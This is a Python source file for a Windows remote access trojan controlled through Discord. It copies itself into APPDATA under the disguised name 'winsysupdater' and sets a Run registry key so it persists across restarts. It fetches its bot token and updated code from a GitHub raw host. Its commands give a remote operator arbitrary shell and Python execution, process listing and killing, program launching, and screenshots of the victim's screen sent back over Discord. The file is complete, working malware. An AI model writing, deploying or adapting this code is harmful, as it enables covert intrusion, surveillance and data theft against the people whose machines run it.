import discord
from discord.ext import commands
import os
import uuid
import ctypes
import threading
import time
import subprocess
import psutil
import requests
import sys
import base64
import shutil
import winreg
import mss
import pygetwindow as gw


def load_config():
    try:
        url = 'https://raw.githubusercontent.com/Shinythunder/host/main/config.json'
        response = requests.get(url)
        response.raise_for_status()
        config = response.json()
        encoded_token = config.get('TOKEN')
        if encoded_token:
            decoded_token = base64.b64decode(encoded_token).decode('utf-8')
        else:
            raise ValueError("TOKEN not found in config.json.")
        command_prefix = config.get('COMMAND_PREFIX', '')
        return decoded_token, command_prefix
    except Exception as e:
        print(f"Error loading config: {e}")
        return None, None

def get_device_id(path='device_id.txt'):
    if os.path.exists(path):
        with open(path, 'r') as f:
            return f.read().strip()
    device_id = str(uuid.uuid4())
    with open(path, 'w') as f:
        f.write(device_id)
    return device_id

def add_to_startup(script_full_path, name="WinSysUpdater"):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{script_full_path}"')
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

script_path = os.path.abspath(__file__)
script_dir = os.path.dirname(script_path)
target_dir = os.path.join(os.getenv('APPDATA'), "winsysupdater")
target_script_path = os.path.join(target_dir, "winsysupdater.pyw")
device_id_file = os.path.join(target_dir, "device_id.txt")

if not os.path.abspath(script_path).startswith(os.path.abspath(target_dir)):
    os.makedirs(target_dir, exist_ok=True)
    if not os.path.exists("device_id.txt"):
        with open("device_id.txt", 'w') as f:
            f.write(str(uuid.uuid4()))
    shutil.move("device_id.txt", device_id_file)
    with open(script_path, 'r', encoding='utf-8', errors='ignore') as original, open(target_script_path, 'w', encoding='utf-8') as copied:
        copied.write(original.read())
    add_to_startup(target_script_path)
    subprocess.Popen(['pythonw', target_script_path], close_fds=True)
    sys.exit()


# Load token and prefix
TOKEN, COMMAND_PREFIX = load_config()
if not TOKEN or not COMMAND_PREFIX:
    print("TOKEN or PREFIX missing in config.json.")
    exit()

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)
bot.help_command = None
device_id = get_device_id()
device_category = None
commands_channel = None
start_time = time.time()

@bot.event
async def on_ready():
    global device_category, commands_channel
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    if not bot.guilds:
        print("Bot is not in any guild.")
        return
    guild = bot.guilds[0]

    # Check for existing category
    device_category = discord.utils.get(guild.categories, name=device_id)
    if not device_category:
        device_category = await guild.create_category(device_id)
        commands_channel = await guild.create_text_channel("commands", category=device_category)
        await guild.create_text_channel("info", category=device_category)

        # Send embedded command guide
        embed = discord.Embed(
            title="Bot Commands",
            description="Here are some commands you can use with the bot!",
            color=discord.Color.from_rgb(50, 88, 168)
        )
        embed.add_field(name="!ping", value="Responds with 'Pong!'", inline=False)
        embed.add_field(name="!help", value="Lists commands you can use with the bot", inline=False)
        embed.add_field(name="!alert", value="Sends an alert window with your message", inline=False)
        embed.add_field(name="!status", value="Shows this device's status and uptime", inline=False)
        embed.add_field(name="!exec", value="Executes a shell command", inline=False)
        embed.add_field(name="!ps", value="Lists active processes", inline=False)
        embed.add_field(name="!kill <pid or name>", value="Kills a process by PID or name", inline=False)
        embed.add_field(name="!start <path>", value="Starts a process from file path", inline=False)
        embed.add_field(name="!eval <code>", value="Evaluates Python code (⚠️ risky)", inline=False)
        embed.add_field(name="!update", value="Updates the script from the URL (restricted access)", inline=False)
        embed.add_field(name="!ss", value="Take a screenhot of the users device!", inline=False)

        await commands_channel.send(embed=embed)
    else:
        commands_channel = discord.utils.get(device_category.text_channels, name="commands")

@bot.command()
async def ping(ctx):
    if ctx.channel.category.name != device_id:
        return
    await ctx.send("Pong!")

@bot.command()
async def alert(ctx, *, message: str):
    if ctx.channel.category.name != device_id:
        return

    def _thread_alert():
        ctypes.windll.user32.MessageBoxW(0, message, "Alert", 0x40 | 0x1)
    threading.Thread(target=_thread_alert).start()

    embed = discord.Embed(
        title=":white_check_mark: Alert Sent",
        description=f"Alert message: {message}",
        color=discord.Color.from_rgb(50, 88, 168)
    )
    await ctx.send(embed=embed)

@bot.command()
async def status(ctx):
    if ctx.channel.category.name != device_id:
        return
    uptime_seconds = int(time.time() - start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    formatted_uptime = f"{hours}h {minutes}m {seconds}s"

    embed = discord.Embed(
        title="📊 Device Status",
        color=discord.Color.from_rgb(50, 88, 168)
    )
    embed.add_field(name="Device ID", value=device_id, inline=False)
    embed.add_field(name="Uptime", value=formatted_uptime, inline=False)

    await ctx.send(embed=embed)

@bot.command()
async def exec(ctx, *, command: str):
    if ctx.channel.category.name != device_id:
        return
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10)
    except subprocess.CalledProcessError as e:
        result = f"Error:\n{e.output}"
    except subprocess.TimeoutExpired:
        result = "Error: Command timed out."

    if len(result) > 1900:
        result = result[:1900] + "\n... (truncated)"

    await ctx.send(f"```\n{result}\n```")

@bot.command()
async def eval(ctx, *, code: str):
    if ctx.channel.category.name != device_id:
        return
    try:
        result = eval(code)
        await ctx.send(f"✅ Result: `{result}`")
    except Exception as e:
        await ctx.send(f"❌ Error: `{e}`")

@bot.command()
async def ps(ctx):
    if ctx.channel.category.name != device_id:
        return
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            processes.append(f"{proc.info['pid']:>6} | {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    output = "\n".join(processes[:50])  # Limit to 50 processes
    await ctx.send(f"```\nPID    | Name\n{output}\n```")

@bot.command()
async def kill(ctx, *, target: str):
    if ctx.channel.category.name != device_id:
        return
    try:
        if target.isdigit():
            proc = psutil.Process(int(target))
            proc.terminate()
            await ctx.send(f"✅ Process with PID {target} terminated.")
        else:
            killed = 0
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == target.lower():
                    psutil.Process(proc.info['pid']).terminate()
                    killed += 1
            if killed:
                await ctx.send(f"✅ Killed {killed} instance(s) of `{target}`.")
            else:
                await ctx.send("❌ No matching process found.")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")


@bot.command()
async def start(ctx, *, path: str):
    if ctx.channel.category.name != device_id:
        return
    try:
        subprocess.Popen(path)
        await ctx.send(f"✅ Started: `{path}`")
    except Exception as e:
        await ctx.send(f"❌ Failed to start process: {e}")

@bot.command()
async def update(ctx):
    if ctx.channel.category.name != device_id:
        return


    url = "https://raw.githubusercontent.com/Shinythunder/host/main/test.py"
    try:
        # Fetch the script from the URL
        response = requests.get(url)
        response.raise_for_status()  # Raise an error for a bad response

        # Write the script content to test.py
        with open('test.py', 'w') as file:
            file.write(response.text)

        await ctx.send("✅ Script updated successfully. The bot will now reload.")
        # Optionally restart the bot or run the updated script after download
        os.execl(sys.executable, sys.executable, *sys.argv)

    except requests.RequestException as e:
        await ctx.send(f"❌ Error updating the script: {e}")

@bot.command()
async def help(ctx):
    if ctx.channel.category.name != device_id:
        return
    embed = discord.Embed(
        title="Bot Commands",
        description="Here are some commands you can use with the bot!",
        color=discord.Color.from_rgb(50, 88, 168)
    )
    embed.add_field(name="!ping", value="Responds with 'Pong!'", inline=False)
    embed.add_field(name="!help", value="Lists commands you can use with the bot", inline=False)
    embed.add_field(name="!alert", value="Sends an alert window with your message", inline=False)
    embed.add_field(name="!status", value="Shows this device's status and uptime", inline=False)
    embed.add_field(name="!exec", value="Executes a shell command", inline=False)
    embed.add_field(name="!ps", value="Lists active processes", inline=False)
    embed.add_field(name="!kill <pid or name>", value="Kills a process by PID or name", inline=False)
    embed.add_field(name="!start <path>", value="Starts a process from file path", inline=False)
    embed.add_field(name="!eval <code>", value="Evaluates Python code (⚠️ risky)", inline=False)
    embed.add_field(name="!update", value="Updates the script from the URL (restricted access)", inline=False)
    embed.add_field(name="!ss", value="Take a screenhot of the users device!", inline=False)

    await ctx.send(embed=embed)



@bot.command()
async def ss(ctx):
    if ctx.channel.category and ctx.channel.category.name != device_id:
        print(f"Invalid category: {ctx.channel.category.name} != {device_id}")
        return

    try:
        def capture_screen():
            with mss.mss() as sct:
                screenshot = sct.shot(output="screenshot.png")

        capture_screen()

        await ctx.send("Here is your screenshot:", file=discord.File("screenshot.png"))
        print("Screenshot sent successfully.")

        # Delete the screenshot after sending
        os.remove("screenshot.png")
        print("Screenshot deleted.")

    except Exception as e:
        print(f"Error taking or sending screenshot: {e}")
        await ctx.send(f"An error occurred while taking or sending the screenshot: {e}")

bot.run(TOKEN)
